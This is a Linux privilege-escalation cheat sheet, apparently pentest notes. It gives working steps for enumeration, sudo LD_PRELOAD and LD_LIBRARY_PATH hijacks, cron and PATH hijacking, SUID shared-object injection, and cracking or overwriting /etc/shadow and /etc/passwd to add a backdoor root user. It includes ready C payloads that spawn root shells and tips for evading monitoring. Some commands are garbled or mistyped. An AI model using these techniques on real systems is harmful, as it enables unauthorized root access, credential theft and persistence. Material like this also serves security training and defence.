## Linux File System

| Directory   | Description                                                                 |
|-------------|-----------------------------------------------------------------------------|
| `/root`     | Root user's home directory. Usually only accessible by the root user.       |
| `/home`     | User directories. Useful for identifying usernames.                         |
| `/etc`      | System configuration files. Contains important files like `passwd` and `shadow`. |
| `/bin` & `/sbin` | System binaries. Contains essential commands for all users (`/bin`) and for root (`/sbin`). |
| `/usr`      | User-installed binaries and libraries.                                      |
| `/var`      | Contains logs. If running Apache, web files may also be found here.         |
| `/dev`      | Device drivers and special device files.                                    |
| `/lib`      | Shared libraries needed by binaries in `/bin` and `/sbin`.                  |
| `/boot`     | Contains files necessary for booting the system (like the kernel).          |
| `/mnt`      | Mount point for external media like USBs and CDs.                           |
| `/proc`     | Virtual filesystem with process information, represented by process numbers.|
| `/tmp`      | Temporary files. Typically world-readable and writable.                     |
## Kernel Exploits

**Often leads to root access**

- Kernels are the core of any operating system.
- Think of it as a layer between application software and the actual computer hardware.
- The kernel has complete control over the operating system. Exploiting a kernel vulnerability can result in execution as the root user.

### Finding kernel exploit

1. **Enumerate kernel version -** `**uname -a**`
2. **Find matching exploits ( Google, ExploitDB, Github)**
3. **Compile and run.**

note: Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.

## Collecting Information

### OS, Kernel & Hostname

Important for kernel exploit

This will print information about operating system and kernel related information , useful in **kernel exploitation**

```
cat /etc/lsb-release

cat /etc/issue

cat /proc/version

hostname

uname -a
```

### Users

```
/etc/passwd
/etc/shadow
```

**Current user and active session:**

```
cat /etc/passwd

id

who

w
```

### Network Information

**Network Adapters** 

```
ifconfig

ip a
```

**Print Routing tables**

```
route
```

**Print the active connections**

```
netstat -antup
```

**Print the arp entries**

```
arp -e
```

**/proc/net/**

more discreet, all the information given by the above commands can be found by looking into the files under /proc/net, and **this approach is less likely to trigger monitoring or other stuff**

```
cat /proc/net/*
```

### Application and Services

**Retrieve information about services**

```
ps aux

ps aux | grep root

ps aux | grep "^root"

<program> --version

<program> -v

dpkg -l | grep <program>
# On Debian-like distributions, dpkg can show installed programs and their version

rpm â€“qa | grep <program>
# On systems that use rpm, the following achieves the same
```

**To retrieve installed applications**

```
dpkg -l
# Debian OS

rpm -qa
# Fedora based OS

pacman -Qe
# Arch based OS

pkginfo
# SOlaris

cd /var/db/pkg/ && ls -d */*
# Gentoo
```

## Sudo and Sudoers

https://gtfobins.github.io/

### Useful commands

```
# Run a program using sudo:
sudo <program>

# Run a program as a specific user:
sudo -u <username><program>

# List programs a user is allowed to run:
sudo -l

# Login as another user:
sudo -i -u scriptmanager
```

### LD_PRELOAD

LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file.

When set, the shared object will be loaded before any others.

**By creating a custom shared object and creating an init() function, we can execute code as soon as the object is loaded.**

**Exploitation **

**1.** Run `sudo -l` to check if **env_keepoption** is set

```
env_keep+=LD_PRELOAD
```

2. Create a file (**preload.c**) with the following contents:

```
#include <stdio.h> 
#include <sys/types.h> 
#include <stdlib.h> 
void _init() { 
    unsetenv("LD_PRELOAD"); 
    setresuid(0,0,0); 
    system("/bin/bash -p"); 
}
```

3. Compile preload.c to preload.so:

```
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

4. Run any allowed program using sudo, **while setting the LD_PRELOAD environment variable to the full path of the preload.so file:**

```
sudo LD_PRELOAD=/tmp/preload.so apache2
```

### LD_LIBRARY_PATH

The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.

The `ldd` command can be used to print the shared libraries used by a program:

`ldd /usr/sbin/apache2`

By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead.

**Exploitation **

**1.** Run `sudo -l` to check if **env_keepoption** is set

```
env_keep+=LD_LIBRARY_PATH
```

**2.** Run `lld` against the apache2 program file -

```
$ ldd /usr/sbin/apache2 
linux-vdso.so.1 => (0x00007fff063ff000) ... 
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7d4199d000) 
libdl.so.2 => /lib/libdl.so.2 (0x00007f7d41798000) 
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7d41570000) 
/lib64/ld-linux-x86-64.so.2 (0x00007f7d42e84000)
```

Hijacking shared objects using this method is hit or miss. Choose one from the list and try it **(libcrypt.so.1 seems to work well).**

3. Create a file (**library_path.c**) with the following contents:


```
#include <stdio.h> 
#include <stdlib.h> 

static void hijack() __attribute__((constructor)); 

void hijack() { 
    unsetenv("LD_LIBRARY_PATH"); 
    setresuid(0,0,0); 
    system("/bin/bash -p"); 
}
```

4. Compile library_path.c into libcrypt.so.1:

```
gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```

5. Run apache2 using sudo, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c):

```
sudo LD_LIBRARY_PATH=. apache2
```

## Cron Jobs

- Cron jobs are programs or scripts which users can schedule to run at specific times or intervals.
- Cron jobs run with the security level of the user who owns them.

```
cat /etc/crontab

crontab -e
```

### Weak File Permission

Misconfiguration of file permissions associated with cron jobs can lead to easy privilege escalation. If we can write to a program or script which gets run as part of a cron job, we can replace it with our own code (Most of time reverse shell)

```
ls -la <Path_of_file_using_in_cronjob>
```

### PATH Environment Variable

The crontab PATH environment variable is by default set to /usr/bin:/bin

The PATH variable can be overwritten in the crontab file.

If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job.

**Steps to check -**

1. First print $PATH variable to see if we can manipulate it according to our need

```
echo $PATH

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

2. Adding our own path to $PATH where we can write our own malicious binary , in this example **/tmp** directory

```
export PATH=/tmp:$PATH
```

it will add **/tmp** in front of **PATH variable** so now when cron job run , it will start looking for that particular binary through $PATH variable and since we put our own path in starting , it will first look for that file in that directory so we ned to put our own malicious binary with same name in our directory

3. Put your malicious binary in directory which you added to $PATH

```
cd /tmp

echo "/bin/bash" > <binary>

chmod +x <binary>
```

## /etc/shadow

**If you are able to read this file**

```
head -n 1 /etc/shadow
```

1. Extract the root user's password

2. Save the password hash in a file

```
echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl XvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
```

3. Crack the password hash using john

```
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t xt hash.txt
```

**If you have writable permission**

**1.** Generate a new **SHA-512** password hash -

```
mkpasswd -m sha-512 newpassword
```

2. Edit the /etc/shadow and replace the root userâ€™s password hash with the one we generated.

## /etc/passwd

**If you have writable permission**

```
openssl passwd "password"
```

1. Generate a password using **opnssl**

2. Edit the /etc/passwd file and enter the hash in the second field of the root user row in the place of 'x'

3. Or you can do it append a new row to it to create **an alternate root user**

```
echo "newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash" >> /etc/passwd
```

## SUID - SGID

### Finding SUID and SGID

```
find / -perm -4000 2>/dev/null
# Print all suid

find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
# Print both SUID and SGID
```

If you get any unusual binary set with SUID or SGID bit , always check on [https://gtfobins.github.io/](https://gtfobins.github.io/) to get exploitation steps to achieve root

### Shared Object Injection

When a program is executed, it will try to load the shared objects it requires.

By using a program called **strace**, we can track these system calls and **determine whether any shared objects were not found.**

If we can write to the location the program tries to open, we can create a shared object and spawn a root shell when it is loaded.

**Exploitation -**

**1.** Find SUID/SGID files on the target:

```
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
... 
-rwsr-sr-x 1 root staff 9861 May 14 2017 /usr/local/bin/suid-so 
...
```

The **suid-so** file should execute with root user permissions.

2. Run `strace` on the SUID file:

```
$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file" 
access("/etc/suid-debug", F_OK) = -1 ENOENT (No such file or directory) 
... 
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

The libcalc.so shared object could not be found, and the program is looking in our userâ€™s home directory, which we can write to.

3. Create the /home/user/.config directory

4. Create the file **libcalc.c** with the following contents:

```
#include <stdio.h> 
#include <stdlib.h> 
static void inject() __attribute__((constructor)); 
void inject() { 
    setuid(0); 
    system("/bin/bash -p"); 
}
```

5. Compile **libcalc.c** into /home/user/.config/libcalc.so:

```
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

6. Run the **SUID** executable to get a root shell:

```
/usr/local/bin/suid-so
```

## Path Manipulation

It is very simple to view the Path of the relevant user with help of echo command.

```
echo $PATH

/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

### Exploitation

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.


## Passwords and configs

### Finding different information

**Scan for password or credential word in files**

```
grep -rnw / -e 'password\|pass\|creds\|credentials' 2>/dev/null -i

find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;

grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
```

### Find all directories which can be written to

```
find / -executable -writable -type d 2> /dev/null
```

**Find all writable files and readable files**

```
find /etc -maxdepth 1 -writable -type f
# Search for writable files in /etc

find /etc -maxdepth 1 -readable -type f
# Search for readable files in /etc
```

### Configs

```
ls -aRl /etc/ * awk '$1 ~ /w.$/' * grep -v lrwx 2>/dev/nullte    
cat /etc/issue{,.net}
cat /etc/master.passwd
cat /etc/group
cat /etc/hosts
cat /etc/crontab
cat /etc/sysctl.conf
for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l; done # (Lists all crons)
cat /etc/resolv.conf
cat /etc/syslog.conf
cat /etc/chttp.conf

cat /etc/ldap/ldap.conf
cat /etc/exports
cat /etc/auto.master
cat /etc/auto_master

find /etc/sysconfig/ -type f -exec cat {} \;
```
